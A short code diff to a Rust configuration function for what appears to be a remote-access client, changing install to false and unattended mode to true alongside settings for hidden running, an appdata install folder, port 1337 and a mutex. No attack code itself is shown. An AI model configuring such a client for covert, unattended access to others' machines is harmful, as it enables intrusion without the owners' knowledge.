@@ -6,7 +6,7 @@ pub fn get_config() -> ClientConfig {
         port: "1337".to_string(),
         group: "Default".to_string(),
 
-        install: true,
+        install: false,
         file_name: "Test.exe".to_string(),
         install_folder: "appdata".to_string(),
         enable_hidden: true,
@@ -14,7 +14,7 @@ pub fn get_config() -> ClientConfig {
 
         mutex_enabled: false,
         mutex: "TEST123".to_string(),
-        unattended_mode: false,
+        unattended_mode: true,
     };
 
     let config_link_sec: Result<ClientConfig, rmp_serde::decode::Error> = rmp_serde::from_read(
